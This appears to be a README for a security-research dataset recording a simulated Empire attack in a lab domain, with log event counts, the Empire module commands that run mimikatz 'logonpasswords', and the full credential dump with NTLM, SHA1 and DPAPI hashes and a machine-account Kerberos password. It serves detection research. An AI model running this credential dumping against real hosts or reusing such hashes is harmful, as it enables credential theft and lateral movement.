# Empire Mimikatz Logonpasswords

An adversary can use mimikatz and module `logonpasswords` to dump credentials from the memory contents of lsass.exe

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_mimikatz_logonpasswords.tar.gz](./empire_mimikatz_logonpasswords.tar.gz)

## Network Environment

Shire

## Time Taken

019-03-19130532

## About this file

| log_name                                 | task                                                   |   events_count  |
|------------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                       | Pipeline Execution Details                             |            2343 |
| Windows PowerShell                       | Provider Lifecycle                                     |               8 |
| Windows PowerShell                       | Engine Lifecycle                                       |               1 |
| Security                                 | Filtering Platform Connection                          |             335 |
| Security                                 | Token Right Adjusted Events                            |             275 |
| Security                                 | User Account Management                                |             148 |
| Security                                 | Detailed File Share                                    |              10 |
| Security                                 | Process Termination                                    |               9 |
| Security                                 | Process Creation                                       |               8 |
| Security                                 | Sensitive Privilege Use                                |               8 |
| Security                                 | Group Membership                                       |               7 |
| Security                                 | Logoff                                                 |               7 |
| Security                                 | Logon                                                  |               7 |
| Security                                 | Special Logon                                          |               7 |
| Security                                 | Authorization Policy Change                            |               6 |
| Security                                 | Other Object Access Events                             |               3 |
| Security                                 | File Share                                             |               1 |
| Microsoft-Windows-Sysmon/Operational     | Process accessed (rule: ProcessAccess)                 |            1520 |
| Microsoft-Windows-Sysmon/Operational     | Registry object added or deleted (rule: RegistryEvent) |            1480 |
| Microsoft-Windows-Sysmon/Operational     | Image loaded (rule: ImageLoad)                         |             994 |
| Microsoft-Windows-Sysmon/Operational     | Registry value set (rule: RegistryEvent)               |             286 |
| Microsoft-Windows-Sysmon/Operational     | Network connection detected (rule: NetworkConnect)     |             180 |
| Microsoft-Windows-Sysmon/Operational     | File created (rule: FileCreate)                        |              70 |
| Microsoft-Windows-Sysmon/Operational     | Pipe Connected (rule: PipeEvent)                       |              57 |
| Microsoft-Windows-Sysmon/Operational     | RawAccessRead detected (rule: RawAccessRead)           |              24 |
| Microsoft-Windows-Sysmon/Operational     | Process Create (rule: ProcessCreate)                   |              14 |
| Microsoft-Windows-Sysmon/Operational     | Pipe Created (rule: PipeEvent)                         |               2 |
| Microsoft-Windows-PowerShell/Operational | Executing Pipeline                                     |            2426 |

## Empire Activity

```
usemodule credentials/mimikatz/logonpasswords*
execute
```

```
[*] Tasked 8BLV6USC to run TASK_CMD_JOB
[*] Agent 8BLV6USC tasked with task ID 2
[*] Tasked agent 8BLV6USC to run module powershell/credentials/mimikatz/logonpasswords
(Empire: powershell/credentials/mimikatz/logonpasswords) > Job started: CD6AR8
Hostname: IT001.shire.com / S-1-5-21-2511471446-1103646877-3980648787

  .#####.   mimikatz 2.1.1 (x64) #17763 Feb 23 2019 12:03:02
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 84172714 (00000000:05045faa)
Session           : Interactive from 2
User Name         : Mmidge
Domain            : SHIRE
Logon Server      : HFDC01
Logon Time        : 3/19/2019 11:40:04 AM
SID               : S-1-5-21-2511471446-1103646877-3980648787-1119
	msv :	
	 [00000003] Primary
	 * Username : Mmidge
	 * Domain   : SHIRE
	 * NTLM     : b415baa073a14f81f8c89a2a384f4a68
	 * SHA1     : 85e07a118d7d6f0841ae1fa5061e4bbdfa24d3a7
	 * DPAPI    : 9375ed71838555731c26915707be9807
	tspkg :	
	wdigest :	
	 * Username : Mmidge
	 * Domain   : SHIRE
	 * Password : (null)
	kerberos :	
	 * Username : Mmidge
	 * Domain   : SHIRE.COM
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 84172686 (00000000:05045f8e)
Session           : Interactive from 2
User Name         : Mmidge
Domain            : SHIRE
Logon Server      : HFDC01
Logon Time        : 3/19/2019 11:40:04 AM
SID               : S-1-5-21-2511471446-1103646877-3980648787-1119
	msv :	
	 [00000003] Primary
	 * Username : Mmidge
	 * Domain   : SHIRE
	 * NTLM     : b415baa073a14f81f8c89a2a384f4a68
	 * SHA1     : 85e07a118d7d6f0841ae1fa5061e4bbdfa24d3a7
	 * DPAPI    : 9375ed71838555731c26915707be9807
	tspkg :	
	wdigest :	
	 * Username : Mmidge
	 * Domain   : SHIRE
	 * Password : (null)
	kerberos :	
	 * Username : Mmidge
	 * Domain   : SHIRE.COM
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 84135757 (00000000:0503cf4d)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/19/2019 11:39:48 AM
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : IT001$
	 * Domain   : SHIRE
	 * NTLM     : 5c03a8bf5d1c76899fbd1ee4178574b8
	 * SHA1     : 1bafcdcc855ae86e06ac39b278243a7990dcb493
	tspkg :	
	wdigest :	
	 * Username : IT001$
	 * Domain   : SHIRE
	 * Password : (null)
	kerberos :	
	 * Username : IT001$
	 * Domain   : shire.com
	 * Password : dFK-5\;zQ5LfJu.+,?sywo9AfG;g_z0'bfgx1Ce]^lNE&mZS;B-OEKK^1[E]+4bKA$WgCj 0f.*bhGdg=0KeSK' H*VY9l!@4ooDV$]$2yM`j/jXEKCp]KMZ
	ssp :	
	credman :	

Authentication Id : 0 ; 84135694 (00000000:0503cf0e)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/19/2019 11:39:48 AM
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : IT001$
	 * Domain   : SHIRE
	 * NTLM     : 5c03a8bf5d1c76899fbd1ee4178574b8
	 * SHA1     : 1bafcdcc855ae86e06ac39b278243a7990dcb493
	tspkg :	
	wdigest :	
	 * Username : IT001$
	 * Domain   : SHIRE
	 * Password : (null)
	kerberos :	
	 * Username : IT001$
	 * Domain   : shire.com
	 * Password : dFK-5\;zQ5LfJu.+,?sywo9AfG;g_z0'bfgx1Ce]^lNE&mZS;B-OEKK^1[E]+4bKA$WgCj 0f.*bhGdg=0KeSK' H*VY9l!@4ooDV$]$2yM`j/jXEKCp]KMZ
	ssp :	
	credman :	

Authentication Id : 0 ; 84132167 (00000000:0503c147)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/19/2019 11:39:47 AM
SID               : S-1-5-96-0-2
	msv :	
	 [00000003] Primary
	 * Username : IT001$
	 * Domain   : SHIRE
	 * NTLM     : 5c03a8bf5d1c76899fbd1ee4178574b8
	 * SHA1     : 1bafcdcc855ae86e06ac39b278243a7990dcb493
	tspkg :	
	wdigest :	
	 * Username : IT001$
	 * Domain   : SHIRE
	 * Password : (null)
	kerberos :	
	 * Username : IT001$
	 * Domain   : shire.com
	 * Password : dFK-5\;zQ5LfJu.+,?sywo9AfG;g_z0'bfgx1Ce]^lNE&mZS;B-OEKK^1[E]+4bKA$WgCj 0f.*bhGdg=0KeSK' H*VY9l!@4ooDV$]$2yM`j/jXEKCp]KMZ
	ssp :	
	credman :	

Authentication Id : 0 ; 1804514 (00000000:001b88e2)
Session           : Interactive from 1
User Name         : pgustavo
Domain            : SHIRE
Logon Server      : HFDC01
Logon Time        : 3/11/2019 10:14:23 PM
SID               : S-1-5-21-2511471446-1103646877-3980648787-1107
	msv :	
	 [00000003] Primary
	 * Username : pgustavo
	 * Domain   : SHIRE
	 * NTLM     : 8ece039f32592670b45fc801e2a9157d
	 * SHA1     : ba22a71f7aa370d915a51f3c30fc561b8ea4b95f
	 * DPAPI    : fd5b6f36bea3f6757701cb443a46219f
	tspkg :	
	wdigest :	
	 * Username : pgustavo
	 * Domain   : SHIRE
	 * Password : (null)
	kerberos :	
	 * Username : pgustavo
	 * Domain   : SHIRE.COM
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 1804488 (00000000:001b88c8)
Session           : Interactive from 1
User Name         : pgustavo
Domain            : SHIRE
Logon Server      : HFDC01
Logon Time        : 3/11/2019 10:14:23 PM
SID               : S-1-5-21-2511471446-1103646877-3980648787-1107
	msv :	
	 [00000003] Primary
	 * Username : pgustavo
	 * Domain   : SHIRE
	 * NTLM     : 8ece039f32592670b45fc801e2a9157d
	 * SHA1     : ba22a71f7aa370d915a51f3c30fc561b8ea4b95f
	 * DPAPI    : fd5b6f36bea3f6757701cb443a46219f
	tspkg :	
	wdigest :	
	 * Username : pgustavo
	 * Domain   : SHIRE
	 * Password : (null)
	kerberos :	
	 * Username : pgustavo
	 * Domain   : SHIRE.COM
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 3/11/2019 9:00:04 PM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 63616 (00000000:0000f880)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/11/2019 8:58:33 PM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : IT001$
	 * Domain   : SHIRE
	 * NTLM     : 5c03a8bf5d1c76899fbd1ee4178574b8
	 * SHA1     : 1bafcdcc855ae86e06ac39b278243a7990dcb493
	tspkg :	
	wdigest :	
	 * Username : IT001$
	 * Domain   : SHIRE
	 * Password : (null)
	kerberos :	
	 * Username : IT001$
	 * Domain   : shire.com
	 * Password : dFK-5\;zQ5LfJu.+,?sywo9AfG;g_z0'bfgx1Ce]^lNE&mZS;B-OEKK^1[E]+4bKA$WgCj 0f.*bhGdg=0KeSK' H*VY9l!@4ooDV$]$2yM`j/jXEKCp]KMZ
	ssp :	
	credman :	

Authentication Id : 0 ; 63559 (00000000:0000f847)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/11/2019 8:58:33 PM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : IT001$
	 * Domain   : SHIRE
	 * NTLM     : 5c03a8bf5d1c76899fbd1ee4178574b8
	 * SHA1     : 1bafcdcc855ae86e06ac39b278243a7990dcb493
	tspkg :	
	wdigest :	
	 * Username : IT001$
	 * Domain   : SHIRE
	 * Password : (null)
	kerberos :	
	 * Username : IT001$
	 * Domain   : shire.com
	 * Password : dFK-5\;zQ5LfJu.+,?sywo9AfG;g_z0'bfgx1Ce]^lNE&mZS;B-OEKK^1[E]+4bKA$WgCj 0f.*bhGdg=0KeSK' H*VY9l!@4ooDV$]$2yM`j/jXEKCp]KMZ
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : IT001$
Domain            : SHIRE
Logon Server      : (null)
Logon Time        : 3/11/2019 8:58:17 PM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : IT001$
	 * Domain   : SHIRE
	 * NTLM     : 5c03a8bf5d1c76899fbd1ee4178574b8
	 * SHA1     : 1bafcdcc855ae86e06ac39b278243a7990dcb493
	tspkg :	
	wdigest :	
	 * Username : IT001$
	 * Domain   : SHIRE
	 * Password : (null)
	kerberos :	
	 * Username : it001$
	 * Domain   : SHIRE.COM
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 40805 (00000000:00009f65)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/11/2019 8:58:04 PM
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : IT001$
	 * Domain   : SHIRE
	 * NTLM     : 5c03a8bf5d1c76899fbd1ee4178574b8
	 * SHA1     : 1bafcdcc855ae86e06ac39b278243a7990dcb493
	tspkg :	
	wdigest :	
	 * Username : IT001$
	 * Domain   : SHIRE
	 * Password : (null)
	kerberos :	
	 * Username : IT001$
	 * Domain   : shire.com
	 * Password : dFK-5\;zQ5LfJu.+,?sywo9AfG;g_z0'bfgx1Ce]^lNE&mZS;B-OEKK^1[E]+4bKA$WgCj 0f.*bhGdg=0KeSK' H*VY9l!@4ooDV$]$2yM`j/jXEKCp]KMZ
	ssp :	
	credman :	

Authentication Id : 0 ; 40613 (00000000:00009ea5)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/11/2019 8:58:04 PM
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : IT001$
	 * Domain   : SHIRE
	 * NTLM     : 5c03a8bf5d1c76899fbd1ee4178574b8
	 * SHA1     : 1bafcdcc855ae86e06ac39b278243a7990dcb493
	tspkg :	
	wdigest :	
	 * Username : IT001$
	 * Domain   : SHIRE
	 * Password : (null)
	kerberos :	
	 * Username : IT001$
	 * Domain   : shire.com
	 * Password : dFK-5\;zQ5LfJu.+,?sywo9AfG;g_z0'bfgx1Ce]^lNE&mZS;B-OEKK^1[E]+4bKA$WgCj 0f.*bhGdg=0KeSK' H*VY9l!@4ooDV$]$2yM`j/jXEKCp]KMZ
	ssp :	
	credman :	

Authentication Id : 0 ; 39288 (00000000:00009978)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 3/11/2019 8:57:53 PM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : IT001$
	 * Domain   : SHIRE
	 * NTLM     : 5c03a8bf5d1c76899fbd1ee4178574b8
	 * SHA1     : 1bafcdcc855ae86e06ac39b278243a7990dcb493
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : IT001$
Domain            : SHIRE
Logon Server      : (null)
Logon Time        : 3/11/2019 8:57:43 PM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : IT001$
	 * Domain   : SHIRE
	 * Password : (null)
	kerberos :	
	 * Username : it001$
	 * Domain   : SHIRE.COM
	 * Password : (null)
	ssp :	
	credman :	

mimikatz(powershell) # exit
Bye!
```